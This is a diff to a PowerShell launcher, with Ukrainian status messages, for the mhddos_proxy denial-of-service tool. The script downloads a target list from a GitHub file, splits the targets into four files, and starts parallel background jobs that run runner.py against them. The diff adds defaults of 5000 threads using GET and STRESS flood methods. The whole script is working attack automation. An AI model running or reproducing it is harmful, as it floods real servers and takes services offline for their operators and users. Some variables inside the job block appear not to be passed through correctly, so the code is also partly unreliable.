@@ -1,5 +1,5 @@
 ﻿[CmdletBinding()]
-param()
+param([int]$threads = 5000, [string[]]$methods = @('GET', 'STRESS'))
 
 $ErrorActionPreference = 'Stop'
 Clear-Host
@@ -25,11 +25,11 @@ Write-MidleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Gr
 
 Write-MidleHost "Завантаження цілей" -NoNewline
 $TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"
-$TargetsList = ( (( Download-String -SourceUrl $TargetsSrc ) -split "\n" | 
+$TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
-    Foreach-Object {
-        [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ }
-} | Sort-Object -Property 'ip' -Unique ).address
+    Foreach-Object { [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ } } |
+    Sort-Object -Property 'ip' -Unique |
+    Select-Object -ExpandProperty 'address'
 
 # create files with targets
 $TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
@@ -38,12 +38,11 @@ $NumberOfTargets = $TargetsList.Length
 
 # little math to calculate number of entries in one file
 $LnInFile = [int]($NumberOfTargets / $NumberOfTargetsFiles)
-
 for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
-    $s = $i * $LnInFile
-    $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($_s + $LnInFile - 1) : ($NumberOfTargets)
+	$s = $i * $LnInFile
+    $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($s + $LnInFile - 1) : ($NumberOfTargets)
     # workaround to save targets without empty line in the end of file as Unix(LF)
-    ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])"
+    ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])" -NoNewline
 }
 
 Write-MidleHost "Знайдено $NumberOfTargets цілей" -Here -NoNewline
@@ -75,10 +74,23 @@ Write-MidleHost "Запуск mhddos_proxy" -Here -NoNewline
 $BackgroundJob = { 
     $StartParams = @{
         'FilePath' = "$PyPath\python.exe"
-        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $FilePath $threads $methods"
+        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $using:FilePath -t $using:threads --http-methods $using:methods"
         'NoNewWindow' = $true
         'PassThru' = $true
         'Wait' = $true
     }
     Start-Process @StartParams
+}
+try {
+    $JobCount = 0
+    foreach ($targetFile in $TargetFiles) {
+        $FilePath = "$RootPath\tmp\$targetFile"
+        $Job = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
+    }
+}
+catch {
+
+}
+finally {
+
 }
